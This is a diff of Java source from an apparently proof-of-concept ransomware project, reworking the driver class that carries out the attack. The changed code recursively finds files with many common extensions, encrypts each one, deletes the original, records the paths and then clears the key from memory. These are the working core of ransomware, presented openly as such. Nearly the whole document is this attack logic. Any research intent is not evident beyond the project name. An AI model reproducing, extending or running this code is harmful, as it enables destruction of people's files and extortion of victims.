@@ -1,22 +1,24 @@
 package ransomware;
 
 import java.io.File;
-import java.io.FileWriter;
 import java.io.IOException;
-import java.security.NoSuchAlgorithmException;
-import java.util.ArrayList;
+import java.nio.charset.StandardCharsets;
+import java.util.Collection;
+
+import org.apache.commons.io.FileUtils;
 
 import ransomware.exceptions.CryptoException;
 
 public class UtilsDriver {
     private static String key = "";
+    private static String[] extensions = { "png", "jpg", "jpeg", "gif", "pdf", "mp4", "mp3", "mid", "cda", "txt", "zip",
+            "7z", "pkg", "tar", "tar.gz", "rar", "z", "json", "js", "html", "log", "sav", "xml", "docx", "bat", "py",
+            "psd", "tif", "tiff" };
+    private static String folderPath = "D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/";
+    private static File encryptedFileList = new File("D:/Coding/POC-Ransomware/src/main/java/ransomware/encryptedFiles.list");
 
-    public static void main(String[] args) throws NoSuchAlgorithmException, IOException {
-        String folderPath = "D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/";
-        File folder = new File(folderPath);
-        ArrayList<File> files = new ArrayList<>(0);
-        ArrayList<String> deletedFiles = new ArrayList<>(0);
-        File[] fileArray = folder.listFiles();
+    public static void main(String[] args) {
+
         String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890`~!@#$%^&*()_+-={}|[];'/.,:?><";
 
         for (int i = 0; i < 32; i++) {
@@ -24,35 +26,63 @@ public class UtilsDriver {
         }
 
         System.out.println(key);
-        
-        for (File file : fileArray) {
-            if (file.getName().endsWith(".txt")) {
-                files.add(file);
-            }
-        }
 
-        for (File inputFile : files) {
-            File encryptedFile = new File(folderPath + inputFile.getName() + ".encrypted");
-            File decryptedFile = new File(folderPath + inputFile.getName() + ".decrypted");
+        File folder = new File(folderPath);
+
+        Collection<File> fileArray = FileUtils.listFiles(folder, extensions, true);
+        fileArray.stream().forEach(t -> {
             try {
-                Utils.encrypt(key, inputFile, encryptedFile);
-                Utils.decrypt(key, encryptedFile, decryptedFile);
-            } catch (CryptoException ex) {
-                System.out.println(ex.getMessage());
-                ex.printStackTrace();
+                encryptHelper(t);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        });
+
+        for (File file : fileArray) {
+            boolean hasExt = false;
+            for (String ext : extensions) {
+                if (hasExt) {
+                    continue;
+                }
+
+                if (file.getName().endsWith(ext)) {
+                    hasExt = true;
+                }
             }
 
-            deletedFiles.add(inputFile.getName());
-            inputFile.delete();
+            if (!hasExt) {
+                fileArray.remove(file);
+            }
         }
+        //File tempFile1 = new File("D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/AK.jpg.encrypted");
+        //File tempDec1 = new File("D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/AKDECRYPTED.jpg");
+        //decryptFile("Zx![#X:Lcun%^beuVc3S7k130_^&C)@A", tempFile1, tempDec1);
+        key = ""; // Remove key from memory
+    }
 
-        File encryptedFileList = new File("D:/Coding/POC-Ransomware/src/main/java/ransomware/encryptedFiles.list");
+    public static void encryptHelper(File inputFile) throws IOException {
+        File encryptedFile = new File(folderPath + inputFile.getName() + ".encrypted");
+        encryptFile(key, inputFile, encryptedFile);
+        inputFile.delete();
+        FileUtils.writeStringToFile(encryptedFileList, inputFile.getAbsolutePath() + "\n", StandardCharsets.UTF_8.name(), true);
+        System.out.println("Encrypted and deleted file: " + inputFile.getName());
+    }
 
-        FileWriter fr = new FileWriter(encryptedFileList, true);
-        for (String fileName : deletedFiles) {
-            fr.write(fileName + "\n");
-            System.out.println("Encrypted and deleted file: " + fileName );
+    public static void encryptFile(String key, File inputFile, File encryptedFile) {
+        try {
+            Utils.encrypt(key, inputFile, encryptedFile);
+        } catch (CryptoException ex) {
+            System.out.println(ex.getMessage());
+            ex.printStackTrace();
         }
-        fr.close();
+    }
+
+    public static void decryptFile(String key, File inputFile, File decryptedFile) {
+        try {
+            Utils.decrypt(key, inputFile, decryptedFile);
+        } catch (CryptoException ex) {
+            System.out.println(ex.getMessage());
+            ex.printStackTrace();
+        }
     }
 }
